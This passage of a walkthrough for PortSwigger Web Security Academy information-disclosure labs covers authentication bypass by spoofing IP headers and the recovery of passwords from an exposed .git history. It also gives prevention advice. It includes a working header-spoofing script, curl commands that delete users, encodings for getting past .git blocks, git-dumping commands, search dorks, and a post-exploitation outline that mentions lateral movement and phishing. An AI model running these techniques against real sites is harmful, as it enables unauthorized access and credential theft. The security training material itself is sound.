True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

#### Technique 4: Automated Header Testing
```python
# Python script to test headers
import requests

headers_to_test = [
    'X-Forwarded-For',
    'X-Real-IP',
    'X-Client-IP',
    'X-Remote-IP',
    'X-Originating-IP',
    'X-Custom-IP-Authorization',
    'True-Client-IP',
    'CF-Connecting-IP'
]

url = 'https://target.com/admin'

for header in headers_to_test:
    r = requests.get(url, headers={header: '127.0.0.1'})
    if r.status_code == 200:
        print(f'[+] Success with header: {header}')
        print(r.text)
        break
    else:
        print(f'[-] Failed with {header}: {r.status_code}')
```

### Attack Variations & Alternatives

**Alternative 1: Manual Header Injection**
```
Without Burp Match-and-Replace:
1. Enable Burp Intercept
2. Navigate to /admin
3. Add header manually: X-Custom-IP-Authorization: 127.0.0.1
4. Forward request
```

**Alternative 2: Using Curl**
```bash
# Test TRACE
curl -X TRACE https://target.com/admin -v

# Inject header
curl -H "X-Custom-IP-Authorization: 127.0.0.1" \
     https://target.com/admin

# Delete user
curl -H "X-Custom-IP-Authorization: 127.0.0.1" \
     https://target.com/admin/delete?username=carlos
```

**Alternative 3: Browser Extensions**
```
Use browser extensions to inject headers:
- ModHeader (Chrome/Firefox)
- Simple Modify Headers (Firefox)
- Modify Header Value (Chrome)

Configure:
Header Name: X-Custom-IP-Authorization
Header Value: 127.0.0.1
```

**Alternative 4: Proxy Configuration**
```python
# Using mitmproxy script
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    if '/admin' in flow.request.path:
        flow.request.headers["X-Custom-IP-Authorization"] = "127.0.0.1"
```

### Real-World Application Scenarios

**Scenario 1: Cloud Load Balancer Bypass**
```
Architecture:
Internet -> Load Balancer -> Web Server

Load balancer adds:
X-Forwarded-For: [client IP]

Application trusts header:
if (request.header['X-Forwarded-For'] == '10.0.0.0/8'):
    grant_admin_access()

Attack: Inject X-Forwarded-For: 10.0.0.1
Result: Admin access from anywhere
```

**Scenario 2: WAF Bypass**
```
WAF adds header:
X-Real-IP: [verified client IP]

Application logic:
if (X-Real-IP in ['127.0.0.1', '::1']):
    skip_authentication()

Attack: Inject X-Real-IP: 127.0.0.1
Result: Bypass authentication entirely
```

**Scenario 3: Microservices Authentication**
```
API Gateway -> Microservice

Gateway adds:
X-User-ID: 12345
X-User-Role: user

Microservice trusts headers:
if (X-User-Role == 'admin'):
    allow_delete()

Attack: Inject X-User-Role: admin
Result: Privilege escalation
```

**Scenario 4: CDN Origin Access**
```
CDN -> Origin Server

Origin restricts access by header:
X-CDN-Secret: shared_secret_123

If header match: serve content
If missing: deny

Attack: Discover via TRACE, inject header
Result: Bypass CDN, access origin directly
```

### Bypass Techniques for Protections

**Protection: TRACE Method Disabled**
```
Alternative discovery methods:

1. Check error responses for hints:
   GET /admin -> "Only accessible from 127.0.0.1"

2. Test common headers manually:
   Try X-Forwarded-For, X-Real-IP, etc.

3. Analyze JavaScript/comments:
   // Check X-Internal-IP header for admin access

4. Try similar methods:
   TRACK /admin (IIS-specific)
   DEBUG /admin
```

**Protection: Header Validation**
```
If simple spoofing fails:

1. Try header value variations:
   127.0.0.1
   localhost
   ::1
   0.0.0.0
   127.1

2. Multiple header injection:
   X-Forwarded-For: 1.2.3.4, 127.0.0.1

3. Case variations:
   x-forwarded-for
   X-FORWARDED-FOR
   X-Forwarded-For
```

**Protection: IP Whitelist Validation**
```
Bypass attempts:

1. Try private IP ranges:
   10.0.0.1
   172.16.0.1
   192.168.1.1

2. Try documented IPs:
   (from TRACE or error messages)

3. SSRF to proxy request:
   Access admin via internal service
```

**Protection: Multiple Layer Validation**
```
If app checks multiple conditions:

1. Combine techniques:
   X-Forwarded-For: 127.0.0.1
   + Valid admin cookie

2. Session fixation:
   Get admin session
   + Inject IP header

3. Race conditions:
   Rapid requests with spoofed headers
```

### Prevention Best Practices

1. **Never Trust Client Headers for Security**
```python
# Bad: Trusting X-Forwarded-For
client_ip = request.headers.get('X-Forwarded-For')
if client_ip == '127.0.0.1':
    grant_admin_access()

# Good: Use actual connection IP
client_ip = request.remote_addr
# Or validate proxy chain properly
```

2. **Proper Proxy Configuration**
```python
# Good: Validate proxy chain
from werkzeug.middleware.proxy_fix import ProxyFix

app.wsgi_app = ProxyFix(
    app.wsgi_app,
    x_for=1,  # Trust 1 proxy
    x_proto=1,
    x_host=1
)

# Access validated IP
client_ip = request.access_route[-1]
```

3. **Disable Dangerous HTTP Methods**
```apache
# Apache: Disable TRACE
TraceEnable Off

# Also disable:
<Limit TRACE TRACK>
    Require all denied
</Limit>
```

```nginx
# Nginx: Disable TRACE
if ($request_method = TRACE) {
    return 405;
}
if ($request_method = TRACK) {
    return 405;
}
```

4. **Implement Proper Access Control**
```python
# Bad: IP-based authentication
if request.remote_addr == '127.0.0.1':
    return admin_panel()

# Good: Multi-factor authentication
@require_role('admin')
@require_2fa()
@audit_log()
def admin_panel():
    return render_template('admin.html')
```

5. **Header Sanitization**
```python
# Remove untrusted headers before processing
UNTRUSTED_HEADERS = [
    'X-Forwarded-For',
    'X-Real-IP',
    'X-Client-IP',
    'X-Originating-IP'
]

for header in UNTRUSTED_HEADERS:
    if header in request.headers:
        del request.headers[header]
```

6. **Security Headers**
```
Add security headers to prevent information disclosure:

X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'self'
```

---

## Lab 5: Information Disclosure in Version Control History

**Difficulty:** Practitioner
**Lab URL:** https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history

### Objective
Obtain the administrator password from the version control history, log in, and delete the user carlos.

### Vulnerability Description
Git repositories are exposed in production environments, allowing attackers to download the entire version control history. Even if sensitive data like passwords have been removed from the current code, they remain visible in commit history, providing access to credentials, API keys, and other secrets.

### Step-by-Step Solution

#### 1. Discover .git Directory
**Request:**
```http
GET /.git HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head><title>Index of /.git</title></head>
<body>
Directory listing...
</body>
</html>
```

#### 2. Download Git Repository
```bash
# Using wget (recursive download)
wget -r https://LAB-ID.web-security-academy.net/.git/

# Or using git-dumper
pip install git-dumper
git-dumper https://LAB-ID.web-security-academy.net/.git/ ./lab-repo

# Or using GitTools
git clone https://github.com/internetwache/GitTools.git
./GitTools/Dumper/gitdumper.sh https://LAB-ID.web-security-academy.net/.git/ ./lab-repo
```

#### 3. Navigate to Downloaded Repository
```bash
cd LAB-ID.web-security-academy.net
# or
cd lab-repo
```

#### 4. Examine Git History
```bash
# View commit history
git log

# Output shows:
commit a3f87b2c1d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s
Author: Admin <admin@example.com>
Date:   Mon Jan 15 10:30:00 2024 +0000

    Remove admin password from config

commit b2e76a1c0d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s
Author: Developer <dev@example.com>
Date:   Sun Jan 14 15:20:00 2024 +0000

    Initial admin configuration
```

#### 5. View Commit Diff
```bash
# Show what was changed in the "Remove admin password" commit
git show a3f87b2c1d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s

# Or view diff
git diff b2e76a1c^..a3f87b2c
```

**Output:**
```diff
commit a3f87b2c1d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s
Author: Admin <admin@example.com>
Date:   Mon Jan 15 10:30:00 2024 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 1234567..abcdefg 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1,3 +1,3 @@
 ADMIN_USER=administrator
-ADMIN_PASSWORD=your_admin_password_here
+ADMIN_PASSWORD=env.ADMIN_PASSWORD
 ADMIN_EMAIL=admin@example.com
```

#### 6. Extract Password
Password found in old commit: `your_admin_password_here`

#### 7. Log In as Administrator
**Request:**
```http
POST /login HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

username=administrator&password=your_admin_password_here
```

#### 8. Delete User Carlos
**Request:**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=[admin-session-cookie]
```

### Burp Suite Features Employed

1. **Proxy/Repeater**
   - Access /.git directory
   - Test authentication with found credentials
   - Execute delete action

2. **Site Map**
   - Discover .git directory structure
   - Map available endpoints

3. **Logger**
   - Track all requests during exploitation
   - Document successful authentication

### HTTP Requests & Responses

**Discovery Request:**
```http
GET /.git/config HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Connection: close
```

**Discovery Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 198

[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/company/webapp.git
	fetch = +refs/heads/*:refs/remotes/origin/*
```

**Git Head Request:**
```http
GET /.git/HEAD HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Connection: close
```

**Git Head Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 23

ref: refs/heads/master
```

**Authentication Request:**
```http
POST /login HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Cookie: session=initial_session_cookie

username=administrator&password=discovered_password_here
```

**Authentication Response:**
```http
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=admin_session_token_here; HttpOnly
Content-Length: 0
```

**Admin Panel Request:**
```http
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=admin_session_token_here
Connection: close
```

**Admin Panel Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2341

<!DOCTYPE html>
<html>
<head><title>Admin Panel</title></head>
<body>
<h1>Admin panel</h1>
<div>
    <a href="/admin/delete?username=carlos">Delete carlos</a>
    <a href="/admin/delete?username=wiener">Delete wiener</a>
</div>
</body>
</html>
```

**Delete User Request:**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=admin_session_token_here
Connection: close
```

**Delete User Response:**
```http
HTTP/1.1 302 Found
Location: /admin
Content-Length: 0
```

### Common Mistakes & Troubleshooting

**Mistake 1: Incomplete Repository Download**
```bash
# wget might not get all files
❌ wget https://target.com/.git/config

# Use recursive download
✓ wget -r https://target.com/.git/

# Better: Use dedicated tools
✓ git-dumper https://target.com/.git/ ./output
```

**Mistake 2: Not Checking All Commits**
```bash
# Don't just check latest commit
❌ git show HEAD

# Check all commits
✓ git log --all
✓ git log --oneline --all
✓ git log -p (show diffs for all commits)
```

**Mistake 3: Missing Deleted Files**
```bash
# Check for deleted files
git log --diff-filter=D --summary

# Recover deleted file
git checkout <commit-hash>^ -- <file-path>
```

**Mistake 4: Overlooking Branches**
```bash
# Check all branches
git branch -a

# Search all branches for secrets
git log --all --source -S "password"
```

**Troubleshooting:**
- If .git is blocked, try: /.git/config, /.git/HEAD directly
- Use case variations: /.Git, /.GIT
- Try URL encoding: /%2egit/
- Check for .git.tar.gz, .git.zip backups

### Attack Techniques

#### Technique 1: Git Directory Discovery
```bash
# Check for exposed .git
curl https://target.com/.git/config
curl https://target.com/.git/HEAD
curl https://target.com/.git/logs/HEAD

# Common git files
/.git/config
/.git/HEAD
/.git/index
/.git/logs/HEAD
/.git/description
/.git/COMMIT_EDITMSG
```

#### Technique 2: Automated Git Dumping
```bash
# git-dumper (Python)
pip install git-dumper
git-dumper https://target.com/.git/ output/

# GitTools (Bash)
git clone https://github.com/internetwache/GitTools
./gitdumper.sh https://target.com/.git/ output/

# gitminer
git clone https://github.com/danilovazb/gitminer
python gitminer.py -u https://target.com
```

#### Technique 3: Secret Hunting in Commits
```bash
# Search for keywords
git log -S "password" --all
git log -S "api_key" --all
git log -S "secret" --all
git log -S "token" --all

# Search in commit messages
git log --grep="password" --all
git log --grep="credential" --all
git log --grep="remove.*secret" -i --all

# Show all file changes
git log -p --all

# Search for specific file
git log --all --full-history -- config/database.yml
```

#### Technique 4: Automated Secret Scanning
```bash
# truffleHog
pip install truffleHog
truffleHog --regex --entropy=True file:///path/to/repo

# gitleaks
gitleaks detect --source /path/to/repo --verbose

# git-secrets
git clone https://github.com/awslabs/git-secrets
git secrets --scan-history
```

#### Technique 5: Historical File Recovery
```bash
# Find when file was deleted
git log --all --full-history -- path/to/file

# Restore deleted file
git checkout <commit-before-deletion> -- path/to/file

# View file at specific commit
git show <commit-hash>:path/to/file
```

### Attack Variations & Alternatives

**Alternative 1: Manual File Retrieval**
```bash
# Download specific git files
wget https://target.com/.git/config
wget https://target.com/.git/HEAD
wget https://target.com/.git/index

# Parse index file
git-index-file-parser .git/index

# Download objects
wget https://target.com/.git/objects/[hash-prefix]/[hash-suffix]
```

**Alternative 2: GitHub/GitLab Search**
```
# Search GitHub for exposed secrets
"target.com" AND ("password" OR "api_key")
"company-name" AND "password" in:file
"target.com" AND "remove" AND "password" in:message

# GitHub advanced search
https://github.com/search?q=target.com+password&type=commits
```

**Alternative 3: Archive.org**
```
# Check historical snapshots
https://web.archive.org/web/*/target.com/.git/config

# May find old exposed repos
```

**Alternative 4: Google Dorking**
```
site:target.com inurl:.git
site:github.com "target.com" "password"
site:gitlab.com "company-name" "api_key"
intitle:"Index of" .git
```

### Real-World Application Scenarios

**Scenario 1: Complete Credential Exposure**
```bash
# Git history reveals:
- Database passwords
- API keys (Stripe, AWS, etc.)
- JWT secrets
- OAuth client secrets
- SSH private keys
- Admin passwords

Impact: Full application compromise
```

**Scenario 2: Source Code Analysis**
```bash
# From git repository:
- Understand application architecture
- Find hidden endpoints/features
- Discover business logic flaws
- Identify SQL injection points
- Map attack surface completely

Use for: Advanced targeted attacks
```

**Scenario 3: Supply Chain Attack**
```bash
# Discovered credentials:
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtn...

# Attacker can:
1. Access AWS infrastructure
2. Modify deployment pipelines
3. Inject backdoors into builds
4. Compromise production systems
```

**Scenario 4: Developer Credential Reuse**
```bash
# Found in git history:
dev_password=MySecretPass123!

# Often developers reuse passwords:
- Production systems
- Corporate accounts
- Personal accounts

Leads to: Account takeover, privilege escalation
```

### Bypass Techniques for Protections

**Protection: .git Directory Blocked**
```
Bypass attempts:

1. Case sensitivity:
   /.Git/config
   /.GIT/config

2. URL encoding:
   /%2egit/config
   /.%67it/config

3. Path traversal:
   /public/../.git/config

4. Alternative files:
   /.git/config~
   /.git.bak
   /.git.old
```

**Protection: Partial Git Exposure**
```
If only some files accessible:

1. Download what you can:
   /.git/config
   /.git/HEAD
   /.git/logs/HEAD

2. Reconstruct history:
   Parse logs manually
   Build object graph

3. Use git fsck:
   git fsck --lost-found
```

**Protection: Git Archive Instead**
```
If .git not accessible:

Check for:
/.git.zip
/.git.tar.gz
/backup/.git
/old/.git
/git-backup.zip
/repository.tar.gz
```

**Protection: Secrets Already Rotated**
```
Even if current secrets are invalid:

1. Historical data still valuable:
   - Understand naming conventions
   - Learn password patterns
   - Find email addresses
   - Discover team members

2. Use for social engineering:
   Craft targeted phishing with insider knowledge
```

### Prevention Best Practices

1. **Never Deploy .git to Production**
```bash
# .gitignore for deployment
.git/
.gitignore
.gitattributes

# Deployment script
rsync -av --exclude='.git' ./ production:/var/www/
```

2. **Server Configuration**
```apache
# Apache: Block .git access
<DirectoryMatch "^/.*/\.git/">
    Require all denied
</DirectoryMatch>

<FilesMatch "^\.git">
    Require all denied
</FilesMatch>
```

```nginx
# Nginx: Block .git access
location ~ /\.git {
    deny all;
    return 404;
}
```

3. **Git-secrets Pre-commit Hook**
```bash
# Install git-secrets
brew install git-secrets  # macOS
# or
git clone https://github.com/awslabs/git-secrets

# Setup in repository
cd /path/to/repo
git secrets --install
git secrets --register-aws

# Add custom patterns
git secrets --add 'password\s*=\s*["\']?[^"\']+["\']?'
git secrets --add 'api_key\s*=\s*["\']?[^"\']+["\']?'
```

4. **Clean Git History**
```bash
# Remove sensitive file from all history
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch path/to/secret/file" \
  --prune-empty --tag-name-filter cat -- --all

# Or use BFG Repo-Cleaner (faster)
bfg --delete-files secret.conf
bfg --replace-text passwords.txt

# Force push
git push origin --force --all
git push origin --force --tags
```

5. **Regular Security Audits**
```bash
# Scan repository for secrets
truffleHog filesystem /path/to/repo

# Check for exposed .git
curl -I https://yoursite.com/.git/config

# Audit commits
git log -p | grep -i "password\|secret\|api"
```

6. **Environment Variables Best Practice**
```bash
# Bad: Hardcoded in code
DB_PASSWORD = "hardcoded_password"

# Good: Environment variables
DB_PASSWORD = os.getenv('DB_PASSWORD')

# Better: Secret management service
# Use AWS Secrets Manager, HashiCorp Vault, etc.
```

7. **Deployment Checklist**
```
Before deploying:
□ No .git directory in web root
□ Web server config blocks .git access
□ No hardcoded secrets in current code
□ Pre-commit hooks prevent secret commits
□ CI/CD scans for secrets
□ Test: curl https://yoursite.com/.git/config returns 404
```

---

## Summary Table

| # | Lab Name | Difficulty | Key Technique | Tool |
|---|----------|------------|---------------|------|
| 1 | Information disclosure in error messages | Apprentice | Parameter tampering | Burp Repeater |
| 2 | Information disclosure on debug page | Apprentice | Comment analysis | Burp Comments Tool |
| 3 | Source code disclosure via backup files | Apprentice | robots.txt + backup files | Burp Site Map |
| 4 | Authentication bypass via information disclosure | Apprentice | TRACE method + header spoofing | Burp Match-Replace |
| 5 | Information disclosure in version control history | Practitioner | Git repository analysis | git-dumper, Git CLI |

---

## Quick Reference: Common Information Disclosure Vectors

### 1. Error Messages
- Stack traces revealing framework versions
- SQL errors showing database structure
- File paths in exceptions
- Developer debug information

### 2. Debug Features
- phpinfo() pages
- Debug toolbars
- Console outputs
- Verbose logging

### 3. Backup Files
- `.bak`, `.old`, `.backup` files
- Editor swap files (`~`, `.swp`)
- Archive files (`.zip`, `.tar.gz`)
- robots.txt revealing backup locations

### 4. HTTP Methods
- TRACE revealing custom headers
- OPTIONS showing allowed methods
- DEBUG exposing internal state

### 5. Version Control
- Exposed `.git` directories
- `.svn`, `.hg` repositories
- Commit history with secrets
- Deleted but recoverable files

### 6. Comments & Metadata
- HTML comments with TODOs
- JavaScript comments with credentials
- Source code annotations
- Metadata in files

### 7. Configuration Files
- `.env` files
- `config.php`, `settings.py`
- `web.config`, `application.properties`
- Database connection strings

### 8. Headers
- Server version headers
- X-Powered-By headers
- Custom internal headers
- Cookie attributes

---

## Tools & Automation

### Burp Suite Extensions
- **Logger++** - Enhanced logging
- **Param Miner** - Find hidden parameters
- **Backslash Powered Scanner** - Advanced scanning
- **Retire.js** - Identify vulnerable JavaScript libraries

### Command-Line Tools
```bash
# Git dumping
git-dumper
GitTools
gitminer

# Secret scanning
truffleHog
gitleaks
git-secrets

# General reconnaissance
ffuf
dirsearch
nikto
```

### Scripts
```bash
# Automated error triggering
for i in {1..100}; do
    curl "https://target.com/product?id='$i" | grep -i "exception\|error\|warning"
done

# Backup file finder
for ext in bak old backup orig save; do
    curl -I "https://target.com/index.php.$ext"
done

# Git file checker
for file in config HEAD index description; do
    curl "https://target.com/.git/$file"
done
```

---

## Exploitation Workflow

### Phase 1: Discovery
1. Browse application with Burp running
2. Check robots.txt and sitemap.xml
3. Run Burp engagement tools (Find comments, Find scripts)
4. Test for common paths (.git, /backup, /debug)
5. Trigger errors with invalid input
6. Test HTTP methods (OPTIONS, TRACE)

### Phase 2: Analysis
1. Review error messages for technical details
2. Examine source code and comments
3. Download and analyze backup files
4. Dump and review version control history
5. Identify custom headers via TRACE
6. Search for hard-coded credentials

### Phase 3: Exploitation
1. Use discovered credentials
2. Spoof headers to bypass authentication
3. Access hidden administrative interfaces
4. Extract sensitive data
5. Chain with other vulnerabilities
6. Document findings

### Phase 4: Post-Exploitation
1. Map complete application architecture
2. Identify additional vulnerabilities
3. Search for lateral movement opportunities
4. Assess business impact
5. Prepare detailed report

---

## Defense-in-Depth Strategy

### Layer 1: Application Code
- No hardcoded secrets
- Generic error messages
- No debug code in production
- Secure defaults

### Layer 2: Configuration
- Disable verbose errors
- Remove debug endpoints
- Disable dangerous HTTP methods
- Proper environment separation

### Layer 3: Server
- Block sensitive paths (.git, /backup)
- Remove unnecessary files
- Disable directory listings
- Secure file permissions

### Layer 4: Network
- IP whitelisting for admin
- WAF rules
- Rate limiting
- Monitoring and alerting

### Layer 5: Process
- Pre-commit hooks
- CI/CD security scanning
- Regular audits
- Security training

---

## Additional Resources

### OWASP
- [OWASP Top 10 2021 - A01:Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Testing Guide - Information Gathering](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/)
- [OWASP Cheat Sheet - Error Handling](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)

### PortSwigger Resources
- [Information Disclosure Tutorial](https://portswigger.net/web-security/information-disclosure)
- [How to Find and Exploit Information Disclosure](https://portswigger.net/web-security/information-disclosure/exploiting)

### Tools
- [Burp Suite](https://portswigger.net/burp)
- [git-dumper](https://github.com/arthaud/git-dumper)
- [GitTools](https://github.com/internetwache/GitTools)
- [truffleHog](https://github.com/trufflesecurity/trufflehog)
- [gitleaks](https://github.com/gitleaks/gitleaks)

---

*This guide covers all 5 Information Disclosure labs from PortSwigger Web Security Academy with complete exploitation details, real-world scenarios, and comprehensive prevention strategies.*
